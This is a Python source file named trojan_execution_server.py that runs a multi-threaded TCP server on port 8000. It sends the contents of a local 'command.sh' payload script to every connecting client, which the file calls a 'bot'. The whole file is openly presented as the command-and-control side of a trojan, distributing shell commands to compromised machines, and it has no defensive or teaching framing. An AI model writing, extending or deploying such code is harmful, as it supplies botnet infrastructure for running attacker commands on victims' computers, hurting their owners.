# trojan_execution_server.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socketserver
import threading
import os

class BotRequestHandler(socketserver.BaseRequestHandler):
    """
    This class handles the communication with each connecting client (bot).
    It inherits from BaseRequestHandler to manage TCP connections.
    """
    def handle(self):
        # Retrieve client IP and current thread name for logging
        client_ip = self.client_address[0]
        thread_name = threading.current_thread().name
        print(f"[{thread_name}] Connection received from: {client_ip}")

        try:
            # Check if the payload script "command.sh" exists in the current directory
            if os.path.exists("command.sh"):
                with open("command.sh", "r") as f:
                    script_content = f.read()
                
                print(f"[{thread_name}] Sending 'command.sh' script to client...")
                # Send the entire script content encoded in UTF-8
                self.request.sendall(script_content.encode('utf-8'))
            else:
                # Notify the client if the script is missing
                error_message = "SCRIPT_NOT_FOUND"
                print(f"[{thread_name}] File 'command.sh' not found.")
                self.request.sendall(error_message.encode('utf-8'))

        except Exception as e:
            print(f"[{thread_name}] Error during script transmission: {e}")
        finally:
            # Ensure the connection is marked as closed in logs
            print(f"[{thread_name}] Connection closed with: {client_ip}")


def main():
    # Define server address (0.0.0.0 listens on all available interfaces)
    HOST, PORT = "0.0.0.0", 8000
    
    # Allow the server to bind to the port immediately after a restart
    socketserver.ThreadingTCPServer.allow_reuse_address = True

    # Initialize a multi-threaded TCP server
    # This allows the server to handle multiple client connections simultaneously
    try:
        with socketserver.ThreadingTCPServer((HOST, PORT), BotRequestHandler) as server:
            print(f"Server listening on {HOST}:{PORT}")
            print("Press CTRL+C to stop the server.")
            # Run the server until an interrupt occurs
            server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutdown requested. Stopping server...")
    finally:
        print("Server stopped.")


if __name__ == "__main__":
    main()
